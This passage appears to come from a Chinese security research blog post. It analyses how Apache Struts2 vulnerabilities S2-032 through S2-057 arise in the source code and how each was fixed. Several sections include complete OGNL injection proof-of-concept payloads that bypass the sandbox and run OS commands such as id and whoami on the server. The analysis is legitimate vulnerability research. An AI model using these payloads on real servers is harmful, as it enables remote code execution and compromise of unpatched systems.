在计算表达式之前，验证是否可以执行

![image-20200519153530702](/images/talk_about_struts2/image-20200519153530702.png)

![image-20200519153555655](/images/talk_about_struts2/image-20200519153555655.png)

这里先看`node.isEvalChain`，这里是对S2-009做的限制，也就是当出现`((1)(2))`时，会解析出`ASTEval`节点，而`ASTEval`对象的`isEvalChain`函数直接返回true，也就使得`(1)(2)`无法执行

其次再来看`node.isSequence`，这里是对形如`(xxx1,xxx2,xxx3)`的OGNL表达式的限制，他将解析出`ASTSequence`节点，`ASTSequence`对象的`isSequence`直接返回true，也就限制了这种表达式的执行

然后比较有意思的是，对于形如`((xxx1).(xxx2).(xxx3))`的OGNL表达式，这是一种`ASTChain`，但其中并不会解析出`ASTEval`

看前面的分析，知道可以将S2-029的修复bypass掉，也就是S2-036的问题

### 13. S2-032/S2-033/S2-037

影响范围：Struts 2.3.20 - Struts Struts 2.3.28 (except 2.3.20.3 and 2.3.24.3)

这里我的环境搭的是rest-showcase的，所以主要讲S2-033（S2-032的原理跟他差不多，只是触发变成了`method:#_xxxx`)

rest-plugin支持解析`xxx!method`的调用

`org.apache.struts2.rest.RestActionMapper#handleDynamicMethodInvocation`解析`name!method`，并对当前的`restactionmapper`设置好后续要调用method

![image-20200520223124404](/images/talk_about_struts2/image-20200520223124404.png)

在struts2的所有intercepter调用完毕后，会去调用DefaultActionInvocation的invokeActionOnly函数

![image-20200520223603177](/images/talk_about_struts2/image-20200520223603177.png)

而invokeActionOnly会去调用`com.opensymphony.xwork2.DefaultActionInvocation#invokeAction`

![image-20200520223738228](/images/talk_about_struts2/image-20200520223738228.png)

在这个函数里，我们可以看到他将前面可控的methodName放进了`ognlUtil.getValue`，导致了OGNL表达式的执行

需要注意的是，在前面调用的interceptor里不能出现异常的情况，会导致无法执行到OGNL表达式执行的位置。这也就是为什么不能在开启`devMode`的情况下进行利用的原因。

#### POC

```java
http://localhost:8080/showcase_war/orders/3!%23_memberAccess%3D%40ognl.OgnlContext%40DEFAULT_MEMBER_ACCESS%2C%23process%3D%40java.lang.Runtime%40getRuntime().exec(%23parameters.command%5B0%5D)%2C%23ros%3D(%40org.apache.struts2.ServletActionContext%40getResponse().getOutputStream())%2C%40org.apache.commons.io.IOUtils%40copy(%23process.getInputStream()%2C%23ros)%2C%23ros.flush()%2C%23xx%3D123%2C%23xx.toString.json?command=ifconfig

// S2-037
http://localhost:8080/showcase_war/orders/3!(%23_memberAccess%3D%40ognl.OgnlContext%40DEFAULT_MEMBER_ACCESS)%3F(%23process%3D%40java.lang.Runtime%40getRuntime().exec(%23parameters.command%5B0%5D)%2C%23ros%3D(%40org.apache.struts2.ServletActionContext%40getResponse().getOutputStream())%2C%40org.apache.commons.io.IOUtils%40copy(%23process.getInputStream()%2C%23ros)%2C%23ros.flush())%3Ad.json?command=ifconfig
```

这里我们执行的命令用`#parameters.command[0]`的方式来获取，这是因为在生成`DefaultActionProxy`的时候对methodName做了转义处理，为了避免转义破坏OGNL表达式，用`#parameters`的方式从参数中获取。

还有一个需要注意的地方是，在最后调用`ognlUtil.getValue`时，在methodName后面拼接了`()`，我们需要将这个`()`做处理，比如这里的POC做的处理是`#xx.toString`去吃掉这个`()`

#### S2-032/S2-033修复

![image-20200520230704180](/images/talk_about_struts2/image-20200520230704180.png)

`xwork-core:2.3.28.1`在`OgnlUtil.isEvalExpression`增加了`isSequence`的判断

这里出现了新的一种利用方式`(1)?(2):(3)`，这种形式的OGNL表达式将有`ASTTest`对象来处理

而`isEvalChain()`和`isSequence()`限制的是`ASTEval`和`ASTSequence`对象，这里并没有对ASTTest做限制，并且由于`isSequence`并不是递归去判断的，所以在`ASTTest`的children节点上再出现`ASTSequence`也是ok的

根据这个原理，我们可以写出新的POC

```java
(#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)?(#process=@java.lang.Runtime@getRuntime().exec(#parameters.command[0]),#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream()),@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros),#ros.flush()):d.json
```

#### S2-037修复

![image-20200520233839824](/images/talk_about_struts2/image-20200520233839824.png)

在解析`name!method`的地方，调用了`cleanupActionName`

![image-20200520233957407](/images/talk_about_struts2/image-20200520233957407.png)

使用了正则，防止出现`(#@)`等特殊字符，出现就报错，也就到不了后续的OGNL表达式的执行

并且在禁止的class列表里增加了两个

![image-20200520234647887](/images/talk_about_struts2/image-20200520234647887.png)

使得我们不能在用`#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS`来绕过限制

#### 一个有意思的地方

前面说到这3个漏洞需要开启DynamicMethodInvocation，其实不开启也是可以的

前面说的几种方法都是在处理`name!method`这个格式，rest其实还支持对`action/id/method`的解析

![image-20200521112254951](/images/talk_about_struts2/image-20200521112254951.png)

所以改改POC就能通杀rest-plugin了

```java
http://localhost:8080/showcase_war/orders/3/(%23_memberAccess%3D%40ognl.OgnlContext%40DEFAULT_MEMBER_ACCESS)%3F(%23process%3D%40java.lang.Runtime%40getRuntime().exec(%23parameters.command%5B0%5D)%2C%23ros%3D(%40org.apache.struts2.ServletActionContext%40getResponse().getOutputStream())%2C%40org.apache.commons.io.IOUtils%40copy(%23process.getInputStream()%2C%23ros)%2C%23ros.flush())%3Ad.json?command=ifconfig
```

## 14. S2-045/S2-046

影响版本：Struts 2.3.5 - Struts 2.3.31, Struts 2.5 - Struts 2.5.10

S2-046原理一样，这里只分析S2-045

这里2.3和2.5版本变化比较大，这里以2.3.31的代码分析，看2.5的可以看https://paper.seebug.org/247/

从struts2的工作流程图来看，所有的请求在生成ActionProxy之前，都由FilterDispatcher来处理，2.3版本用的是`org.apache.struts2.dispatcher.ng.filter.StrutsPrepareAndExecuteFilter`，这里在调用action之前会先封装request。

看看调用栈

![image-20200521154143972](/images/talk_about_struts2/image-20200521154143972.png)

封装实际由`org.apache.struts2.dispatcher.Dispatcher#wrapRequest`处理

![image-20200521154319856](/images/talk_about_struts2/image-20200521154319856.png)

可以看到这里在处理`Content-Type: multipart/form-data`类型时，会生成`org.apache.struts2.dispatcher.multipart.MultiPartRequestWrapper`处理，S2-045就是出问题在这里

![image-20200521154524558](/images/talk_about_struts2/image-20200521154524558.png)

在用`JakartaMultiPartRequest`解析request包时，调用`org.apache.commons.fileupload.FileUploadBase.FileItemIteratorImpl#FileItemIteratorImpl`来检查Content-Type的内容，需要由multipart/开头才行，不然就是报错并将具体的contentType内容写到异常里

![image-20200521155036903](/images/talk_about_struts2/image-20200521155036903.png)

这里我们的可控数据就到了异常上，就看struts2是怎么处理异常了

`org.apache.struts2.dispatcher.multipart.JakartaMultiPartRequest#parse`

![image-20200521155309089](/images/talk_about_struts2/image-20200521155309089.png)

![image-20200521155346720](/images/talk_about_struts2/image-20200521155346720.png)

可控内容传入了`com.opensymphony.xwork2.util.LocalizedTextUtil#findText`

![image-20200521155451100](/images/talk_about_struts2/image-20200521155451100.png)

![image-20200521155901705](/images/talk_about_struts2/image-20200521155901705.png)

当前都没生成错误信息时，将获取默认的message

![image-20200521155825583](/images/talk_about_struts2/image-20200521155825583.png)

这里到了我们熟悉的`TextParseUtil.translateVariables`函数，他后续会处理计算OGNL表达式

简单来说，整个过程从报错开始存入OGNL表达式，再生成错误信息的时候计算了OGNL表达式

到了这里执行可控的OGNL表达式是第一步，因为2.3.29增加了对`#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS`的限制

需要一种新的思路来绕过，S2-045的POC就给我们提供这样一个思路

#### POC

```java
%{
(#_='multipart/form-data').
(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).
(#_memberAccess?(#_memberAccess=#dm):
		(
		(#container=#context['com.opensymphony.xwork2.ActionContext.container']).
		(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).
		(#ognlUtil.getExcludedPackageNames().clear()).
		(#ognlUtil.getExcludedClasses().clear()).
		(#context.setMemberAccess(#dm)))).
(#cmd='id').
(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).
(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).
(#p=new java.lang.ProcessBuilder(#cmds)).
(#p.redirectErrorStream(true)).
(#process=#p.start()).
(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).
(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).
(#ros.flush())
}
```

主要看5-10行，一开始的思路是直接用赋值的方式来覆盖存在限制的SecurityMemberAccess，但是现在有了`excludedClasses`的限制不能直接用这种方式来达成（具体看`SecurityMemberAccess.isAccessible`）。

那么就看看能不能用setters去设置`SecurityMemberAccess`

这里就看`ognl.OgnlContext#setMemberAccess`，而这个context就是我们在OGNL表达式里用`#context`表示的

那么直接用`#context.setMemberAccess(@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)`就可以覆盖原有的MemberAccess，但是因为`#context`本身就是被禁止的类，我们不能直接调用他。

我们需要首先去除掉`ExcludedPackageNames`和`ExcludedClasses`

来看看他是怎么设置的`com.opensymphony.xwork2.ognl.OgnlValueStack#setOgnlUtil`

![image-20200521172344561](/images/talk_about_struts2/image-20200521172344561.png)

可以看到`securityMemberAccess`的相关禁用设置都是来自于`ognlUtil`，这意味着我们只需要清除掉`ognlUtil`的禁用设置就可以消除掉`securityMemberAccess`的限制。这是因为在jvm里面他们用的都是同一个实例。

所以上面的POC中用struts2的container的方式去获取ognlUtil实例，并将其禁用设置全部清除掉

那么后面再用`#context.setMemberAccess`就没有阻碍了

后续的代码就是执行并回显了，跟前面的类似

#### 修复

![image-20200521204140738](/images/talk_about_struts2/image-20200521204140738.png)

修复主要是不把message传入，放到了args的位置

### 15. S2-048

这一部分不仔细说了，看https://www.freebuf.com/vuls/217482.html

### 16. S2-052

影响范围:Struts 2.1.6 - Struts 2.3.33, Struts 2.5 - Struts 2.5.12

> The REST Plugin is using a `XStreamHandler` with an instance of XStream for deserialization without any type filtering and this can lead to Remote Code Execution when deserializing XML payloads.

struts2的rest插件注册了ContentTypeInterceptor来处理不同的content-type

![image-20200522100814912](/images/talk_about_struts2/image-20200522100814912.png)

针对xml类型，将调用`XStreamHandler`来处理

`org.apache.struts2.rest.ContentTypeInterceptor#intercept`

![image-20200522101114659](/images/talk_about_struts2/image-20200522101114659.png)

根据request请求选择handler，这里我们传入`application/xml`类型，将使用`org.apache.struts2.rest.handler.XStreamHandler#toObject`来处理xml

![image-20200522101244620](/images/talk_about_struts2/image-20200522101244620.png)

这里用了最简单的调用方式（1.4.8版本），没有做xstream的相关安全处理，导致XStream反序列化

所以我们传入构造好的XML就可以达到命令执行

#### POC

这里的xml可以用我的ysomap去生成，把Content-Type设置成`application/xml`就可以了

#### 修复

S2-052跟以往的漏洞不一样，这里跟OGNL表达式并没有什么关系了，修复也比较简单

升级XStream到了1.4.10版本，并且添加了安全措施

![image-20200522102217477](/images/talk_about_struts2/image-20200522102217477.png)

这里新添加了`AllowedClasses`、`AllowedClassNames`、`XStreamPermissionProvider`来设置每个类可以反序列化的对象列表

也会添加一些默认的类

![image-20200522102927472](/images/talk_about_struts2/image-20200522102927472.png)

这里的用法就是XStream官方推荐的，采用白名单的方式来防止不安全的反序列化

### 17. S2-053

影响版本:Struts 2.0.0 - 2.3.33 ,Struts 2.5 - Struts 2.5.10.1

S2-053问题出在freemarker的标签内容可控时出现的问题

![image-20200522103937515](/images/talk_about_struts2/image-20200522103937515.png)

在action执行结束后，由于设置的类型为freemarker，所以结果交由freemarker来处理

![image-20200522111039529](/images/talk_about_struts2/image-20200522111039529.png)

关注对freemarker标签解析的类`org.apache.struts2.views.freemarker.tags.CallbackWriter#onStart`

![image-20200522111238176](/images/talk_about_struts2/image-20200522111238176.png)

因为这里我们时url标签，所以由`org.apache.struts2.components.URL#start`来处理

![image-20200522111315111](/images/talk_about_struts2/image-20200522111315111.png)

回到了由`ServletUrlRenderer`来解析我们传入的OGNL表达式，跟S2-013一样，后续也是由`TextParseUtil.translateVariables`触发的

#### POC

poc可以直接用S2-045的poc

```java
%{(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='id').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(@org.apache.commons.io.IOUtils@toString(#process.getInputStream()))}
// 记得编码
```

#### 修复

> 这次的修复是在FreemarkerManager中多了两行代码，
>
> ```
>  LOG.debug("Sets NewBuiltinClassResolver to TemplateClassResolver.SAFER_RESOLVER", new String[0]);
> configuration.setNewBuiltinClassResolver(TemplateClassResolver.SAFER_RESOLVER);
> ```
>
> 去看了一下TemplateClassResolver.SAFER_RESOLVER)的官方文档，
>
> ```
> TemplateClassResolver.SAFER_RESOLVER now disallows creating freemarker.template.utility.JythonRuntime and freemarker.template.utility.Execute. This change affects the behavior of the new built-in if FreeMarker was configured to use SAFER_RESOLVER, which is not the default until 2.4 and is hence improbable.
> ```
>
> 大致意思应该就是禁止了freemarker的RCE，具体我对freemarker不太了解，就不去误人子弟了。

修复直接参考https://www.freebuf.com/vuls/217482.html

### 18. S2-055

影响范围：Struts 2.5 - Struts 2.5.14

S2-055漏洞原理跟S2-052一样，由jackson库处理json内容时产生的漏洞，这里默认不是用jackson处理json内容的，得在struts.xml配置

```xml
<bean type="org.apache.struts2.rest.handler.ContentTypeHandler" name="jackson" class="org.apache.struts2.rest.handler.JacksonLibHandler"/>
    <constant name="struts.rest.handlerOverride.json" value="jackson"/>
```

这里本身是因为jackson反序列化问题产生的，后面抽空分析一下这个jackson，这里不继续分析了

因为需要配置才可以打，所以这里的危害并没有想xstream一样严重

具体分析见[http://xxlegend.com/2017/12/06/S2-055%E6%BC%8F%E6%B4%9E%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA%E4%B8%8E%E5%88%86%E6%9E%90/](http://xxlegend.com/2017/12/06/S2-055漏洞环境搭建与分析/)

### 19. S2-057

影响范围：Struts 2.0.4 - Struts 2.3.34, Struts 2.5.0 - Struts 2.5.16

> 北京时间8月22日13时，Apache官方发布通告公布了Struts2中一个远程代码执行漏洞（CVE-2018-11776）。该漏洞在两种情况下存在，第一，在xml配置中未设置namespace值，且上层动作配置（upper action(s) configurations）中未设置或用通配符namespace值。第二，使用未设置 value和action值的url标签，且上层动作配置（upper action(s) configurations）中未设置或用通配符namespace值。
>
> https://paper.seebug.org/682/

这里一种配置方案是

![image-20200522152919691](/images/talk_about_struts2/image-20200522152919691.png)

没有配置namespace，访问s2057.action都会导向test.action，这里处理redirectAction的是

![image-20200522153229727](/images/talk_about_struts2/image-20200522153229727.png)

`org.apache.struts2.dispatcher.ServletActionRedirectResult#execute`

![image-20200522153556365](/images/talk_about_struts2/image-20200522153556365.png)

`ServletActionRedirectResult`会将namespace一起拼接进location，比如`/s2vuls/${1*2}/s2057.action`,其namespace为`/${1*2}`,actionName为跳转的test，最终location为`/${1*2}/test.action`。到这里我们就引入了OGNL表达式，看后续的一个处理

`org.apache.struts2.dispatcher.StrutsResultSupport#execute`

![image-20200522154209594](/images/talk_about_struts2/image-20200522154209594.png)

到这里，就开始熟悉起来了，就是S2-012的漏洞触发点

![image-20200522154315511](/images/talk_about_struts2/image-20200522154315511.png)

传入了`TextParseUtil.translateVariables`，到这里就结束了，后续将调用OGNL.getValue

#### POC

在2.3.x版本，可以直接用S2-045的poc打

```
/%24%7B%28%23dm%3D@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS%29.%28%23ct%3D%23request%5B%27struts.valueStack%27%5D.context%29.%28%23cr%3D%23ct%5B%27com.opensymphony.xwork2.ActionContext.container%27%5D%29.%28%23ou%3D%23cr.getInstance%28@com.opensymphony.xwork2.ognl.OgnlUtil@class%29%29.%28%23ou.getExcludedPackageNames%28%29.clear%28%29%29.%28%23ou.getExcludedClasses%28%29.clear%28%29%29.%28%23ct.setMemberAccess%28%23dm%29%29.%28%23cmd%3D%27whoami%27%29.%28%23iswin%3D%28@java.lang.System@getProperty%28%27os.name%27%29.toLowerCase%28%29.contains%28%27win%27%29%29%29.%28%23cmds%3D%28%23iswin%3F%7B%27cmd%27%2C%27/c%27%2C%23cmd%7D%3A%7B%27/bin/bash%27%2C%27-c%27%2C%23cmd%7D%29%29.%28%23p%3Dnew%20java.lang.ProcessBuilder%28%23cmds%29%29.%28%23p.redirectErrorStream%28true%29%29.%28%23process%3D%23p.start%28%29%29.%28%23ros%3D%28@org.apache.struts2.ServletActionContext@getResponse%28%29.getOutputStream%28%29%29%29.%28@org.apache.commons.io.IOUtils@copy%28%23process.getInputStream%28%29%2C%23ros%29%29.%28%23ros.flush%28%29%29%7D/s2057.action
```

而对于2.5.x版本，我们需要好好分析一下

```java
${
(#ct=#request['struts.valueStack'].context).
(#cr=#ct['com.opensymphony.xwork2.ActionContext.container']).
(#ou=#cr.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).
(#ou.setExcludedClasses('')).
(#ou.setExcludedPackageNames('')).
(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).
(#ct.setMemberAccess(#dm)).(#cmd='whoami').
(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).
(#cmds=(#iswin?{'cmd','/c',#cmd}:{'/bin/bash','-c',#cmd})).
(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).
(#process=#p.start()).
(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).
(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())
}
```

从poc来看，从第7行开始都是我们熟悉的操作，那么前面多了那么多是在做什么？

参考：https://paper.seebug.org/794/#35-struts-2516

在struts2 2.5.13版本之后，ognl库进行了更新，从3.1.12->3.1.15，其主要的一个变化是禁止访问`context.map`，OgnlContext的get、put、remove函数中都删除了对当前context的操作

此外，excluded相关的集合被设置为不可变，无法通过clear的方式来清除

针对上面两种的绕过

> 文章提出了这么一种思路:
>
> - 没有办法使用`context.map`，可以调用`attr`，前文说过`attr`中保存着整个`context`的变量与方法，可以通过`attr`中的方法返回给我们一个`context.map`。
> - 没有办法直接调用`excludedClasses`，也就不能使用`clear`方法来清空，但是还可以利用`setter`来把`excludedClasses`给设置成空
> - 清空了黑名单，我们就可以利用`DefaultMemberAccess`来覆盖`_memberAccess`，来执行静态方法了。
>
> 而这里又会出现一个问题，当我们使用`OgnlUtil`的`setExcludedClasses`和`setExcludedPackageNames`将黑名单置空时并非是对于源（全局的OgnlUtil）进行置空，也就是说`_memberAccess`是源数据的一个引用，就像前文所说的，在每次`createAction`时都是通过`setOgnlUtil`利用全局的源数据创建一个引用，这个引用就是一个`MemberAccess`对象，也就是`_memberAccess`。所以这里只会影响这次请求的`OgnlUtil`而并未重新创建一个新的`_memberAccess`对象，所以旧的`_memberAccess`对象仍未改变。
>
> 而突破这种限制的方式就是再次发送一个请求，将上一次请求已经置空的`OgnlUitl`作为源重新创建一个`_memberAccess`，这样在第二次请求中`_memberAccess`就是黑名单被置空的情况，这个时候就释放了`DefaultMemberAccess`，就可以进行正常的覆盖以及执行静态方法。

看过上面的分析后再来看poc，第二行获取了context，第3 4 5 6行清除了excluded相关的集合，但其当前的请求黑名单还是存在的，所以在2.5.x版本我们需要发送两次这个poc，第一次清楚黑名单，第二次覆盖`_memberAccess`并调用静态函数



## 0x03 总结

---

在分析过程中，参考了很多师傅们的笔记，这里特别感谢一下XD

从整个s2漏洞的历程来看，能看到很多漏洞其实利用点是相似的，只是说从哪个入口进去可能有所不同。这种漏洞的分析我认为用数据流分析是非常合适的。lgtm的师傅就用了他们的codeql发现了S2-057这个漏洞。

但是官方在一次次修复中，对于ognl表达式的执行限制的越来越多，使得如今就算出现ognl表达式注入也很难造成RCE的效果。

这里我们可以直接看[lucifaer](https://paper.seebug.org/users/author/?nickname=lucifaer)师傅的那篇文章

从时间线来看，

1. struts2 2.3.14.1之前，ognl表达式执行没有什么障碍；2.3.14.1增加了`SecurityMemberAccess`，禁止静态函数执行`allowStaticMethodAccess=false`，在ognl表达式里面可以重新置为true；后续这个值被改成了final，无法被更改
2. struts2 2.3.20之前，虽然不能改`allowStaticMethodAccess`，但是可以通过构造函数的方式绕过；2.3.20之后，增加了黑名单
3. struts2 2.3.29之前，通过`#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS`这种方式初始化，清空黑名单；2.3.29之后，新增了黑名单，限制了这种方式的执行
4. struts2 2.3.34/2.5.16之前，通过container实例化`ognlUtil`，清空黑名单，详细见S2-045；之后禁止了context.map的访问和excludedClasses不可变，不能通过clear清楚
5. struts2 2.5.17之前，通过request中获取context，绕过context.map禁止访问的限制，详细见S2-057；之后新增了黑名单，完全禁止通过ognl的包来对stack做操作
6. 后续几个版本也更新了很多安全措施，具体见lucifaer师傅的文章

在分析完struts2之后，也改变了对很有名的漏洞的感官，以前总觉得struts漏洞都是比较复杂的，但是现在想想有精彩复杂的地方也会有很傻的地方。

不能对还没有分析过的框架或者应用持有畏惧之心，共勉XD